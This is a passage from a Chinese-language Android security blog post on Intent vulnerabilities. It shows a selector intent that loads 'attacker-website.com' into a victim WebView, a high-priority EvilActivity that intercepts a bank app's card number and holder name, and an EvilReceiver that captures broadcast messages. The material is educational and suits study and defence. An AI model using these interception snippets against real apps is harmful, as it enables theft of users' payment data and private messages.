+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setSelector(new Intent().setClassName(&quot;com.victim&quot;, &quot;com.victim.AuthWebViewActivity&quot;));</span><br><span class="line">intent.putExtra(&quot;url&quot;, &quot;http://attacker-website.com/&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>尝试查找可以处理 Intent 的实体（而不是 Intent 的主要内容）时，将使用选择器。</p>
+<p>但是，开发人员可以将选择器显式设置为 <code>null</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intent.setComponent(null);</span><br><span class="line">intent.setSelector(null);</span><br></pre></td></tr></table></figure>
+
+<p>即便如此，您也可以创建一个隐式意图来匹配  某些未导出活动的<code>intent-filter</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.AuthWebViewActivity&quot; android:exported=&quot;false&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">        &lt;data android:scheme=&quot;victim&quot; android:host=&quot;secure_handler&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="不安全活动启动"><a href="#不安全活动启动" class="headerlink" title="不安全活动启动"></a>不安全活动启动</h3><p>如果应用对某些私有数据使用隐式Intent来启动Activity，则可以开始处理相同的操作来拦截私有数据。例如，假设银行应用对卡数据使用隐式Intent来启动Activity：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.AddCardActivity&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.victim.ADD_CARD_ACTION&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent(&quot;com.victim.ADD_CARD_ACTION&quot;);</span><br><span class="line">intent.putExtra(&quot;credit_card_number&quot;, num.getText().toString());</span><br><span class="line">intent.putExtra(&quot;holder_name&quot;, name.getText().toString());</span><br><span class="line">// ...</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<p>您可以按如下方式截获卡数据：</p>
+<p>AndroidMainfest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.EvilActivity&quot;&gt;</span><br><span class="line">    &lt;intent-filter android:priority=&quot;999&quot;&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.victim.ADD_CARD_ACTION&quot; /&gt;</span><br><span class="line">        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/activity&gt;</span><br></pre></td></tr></table></figure>
+
+<p>EvilActivity.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Log.d(&quot;d&quot;, &quot;Number: &quot; + getIntent().getStringExtra(&quot;credit_card_number&quot;));</span><br><span class="line">Log.d(&quot;d&quot;, &quot;Holder: &quot; + getIntent().getStringExtra(&quot;holder_name&quot;));</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure>
+
+<p>android:priority比较高就会优先拦截卡号姓名信息。</p>
+<h3 id="不安全的广播"><a href="#不安全的广播" class="headerlink" title="不安全的广播"></a>不安全的广播</h3><p>如果应用使用隐式Intent来传递广播，则可以使用相同的操作注册广播接收器，并从其他应用拦截用户的广播。例如，假设消息传递服务从服务器请求新消息，并将其传递给负责在用户屏幕上显示这些消息的广播接收器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = new Intent(&quot;com.victim.messenger.IN_APP_MESSAGE&quot;);</span><br><span class="line">intent.putExtra(&quot;from&quot;, id);</span><br><span class="line">intent.putExtra(&quot;text&quot;, text);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure>
+
+<p>由于隐式广播会传送到设备上注册的每个接收器，因此可以跨所有应用注册以下广播接收器来拦截用户的广播：</p>
+<p>AndroidManifest.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;receiver android:name=&quot;.EvilReceiver&quot;&gt;</span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=&quot;com.victim.messenger.IN_APP_MESSAGE&quot; /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line">&lt;/receiver&gt;</span><br></pre></td></tr></table></figure>
+
+<p>EvilReceiver.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class EvilReceiver extends BroadcastReceiver &#123;</span><br><span class="line">    public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">        if (&quot;com.victim.messenger.IN_APP_MESSAGE&quot;.equals(intent.getAction())) &#123;</span><br><span class="line">            // log intercepted data</span><br><span class="line">            Log.d(&quot;d&quot;, &quot;From: &quot; + intent.getStringExtra(&quot;from&quot;));</span><br><span class="line">            Log.d(&quot;d&quot;, &quot;Text: &quot; + intent.getStringExtra(&quot;text&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="LINK"><a href="#LINK" class="headerlink" title="LINK"></a>LINK</h2><p><a target="_blank" rel="noopener" href="https://0xn3va.gitbook.io/cheat-sheets/android-application/intent-vulnerabilities">Intent漏洞</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>tea9</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://tea9.xyz/post/1486973838.html">http://tea9.xyz/post/1486973838.html</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/android%E5%AE%89%E5%85%A8/"># android安全</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/post/505929609.html">writeup：InjuredAndroid脆弱的安卓程序Challenge1-6</a>
+            
+            
+            <a class="next" rel="next" href="/post/1259403264.html">facebook的xss复现</a>
+            
+        </section>
+    </article>
+</div>
+
+
+
+
+            </div>
+            <footer id="footer" class="footer">
+ 
+    <div class="copyright">
+        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+   
+</footer>
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
